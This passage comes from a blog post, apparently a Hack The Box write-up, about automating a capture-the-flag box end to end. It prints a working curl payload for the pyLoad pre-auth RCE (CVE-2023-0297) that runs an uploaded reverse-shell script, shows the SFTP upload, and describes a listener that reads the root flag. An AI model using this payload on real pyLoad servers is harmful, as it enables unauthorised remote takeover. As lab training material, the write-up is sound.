</span></span><span style="display:flex;"><span>    ssh_stdin, ssh_stdout, ssh_stderr <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>client<span style="color:#f92672">.</span>exec_command(command)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ssh_stdout<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
</span></span></code></pre></div><h2 id="pyload-cve">PyLoad CVE</h2>
<p>PyLoad is an open-source download manager. PyLoad versions prior to 0.5.0b3.dev31 are vulnerable to pre-auth RCE (CVE-2023–0297). There are many available exploits for this vulnerability. You can read more about the vulnerability and the exploit <a href="https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad">here</a>.</p>
<p>The vulnerability allows us to execute a payload like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -i -s -k -X <span style="color:#e6db74">$&#39;POST&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>--data-binary
</span></span><span style="display:flex;"><span><span style="color:#e6db74">$&#39;jk=pyimport%20os;os.system(\&#34;bash%20/home/sau/shell.sh\&#34;);f=function%20f2()
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">{};&amp;package=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">$&#39;http://localhost:8000/flash/addcrypted2&#39;</span>
</span></span></code></pre></div><p>Here, I am running a script called <a href="https://github.com/anuraagbaishya/htb-pc/blob/main/shell.sh"><code>shell.sh</code></a> which is just a bash reverse shell.</p>
<p>PyLoad on this box is not available publicly. It can only be accessed from within the box. The official write-up uses SSH tunneling to tunnel from the user’s machine to the box. I chose the alternative option of running the exploit from within the SSH session, using the same <code>exec_command</code> function I used to read the user flag.</p>
<p>I used SFTP to transfer the reverse shell to the box:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">transfer_file_from_local</span>(self):
</span></span><span style="display:flex;"><span>    ftp_client <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>client<span style="color:#f92672">.</span>open_sftp()
</span></span><span style="display:flex;"><span>    ftp_client<span style="color:#f92672">.</span>put(<span style="color:#e6db74">&#34;shell.sh&#34;</span>, <span style="color:#e6db74">&#34;/home/sau/shell.sh&#34;</span>)
</span></span></code></pre></div><p>The last step is to start a reverse shell listener and then read the root flag from within the reverse shell session. For this, I created a simple <a href="https://github.com/anuraagbaishya/htb-pc/blob/main/revsh.py">socket client</a> which listens for a connection and then performs <code>cat /root/root.txt</code>.</p>
<p>I ran both the exploitation script and the socket client as two separate processes using a shell script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#! /bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>python auto_exploit.py &amp;
</span></span><span style="display:flex;"><span>python revsh.py
</span></span></code></pre></div><p>It might (should) be possible to run the exploitation part and socket listener as separate threads of the same process. I tried for a bit, but it didn’t work and I just chose the easy way out.</p>
<p>Running the runner script, I got both the user and root flags:</p>
<p><img src="/flags.webp" alt="Flags"></p>
<h2 id="closing-thoughts">Closing Thoughts</h2>
<p>This experiment was a lot of fun. After completing this box, I pondered over what makes a box scriptable. I think the correct answer is — all boxes are scriptable if one is willing to persevere. The more practical questions what makes a box easy to script. I have come up with these criteria:</p>
<ul>
<li>Requires little to no UI interaction like clicking buttons, filing forms, etc that cannot be replicated using direct web / API calls. It might be possible to replicate these functionalities using selenium or similar — but that increases the complexity of the script.</li>
<li>Related to the above — requires performing operations using some software running on one of the open ports or the machine. These might be web UIs or even CLI programs installed in the box.</li>
<li>Has a lot of steps / requires running a lot of tools. The time required to create the script will be directly proportionate to the number of steps.</li>
</ul>
<p>This was the first (and only) box I have tried to script. I have done a few other boxes after this one, but I did not spend time trying to script them because of one of the above reasons. As I complete more boxes, I will continue to assess if the box is easy to script. If yes, great! If not, it may have to do with one of the above reasons, or I might have some other new reasons.</p>
<p>That’s it from me. This is my 2023 contribution to my blog. I will not promise anything else here till a really long time has passed since this publication. I usually don’t work on technical things during my free time. Most (if not all) of the security work I do is by virtue of my employment. Therefore, there usually is not much for me to share.</p>
<p>Thanks for reading!</p>
]]></content>
        </item>
        
    </channel>
</rss>
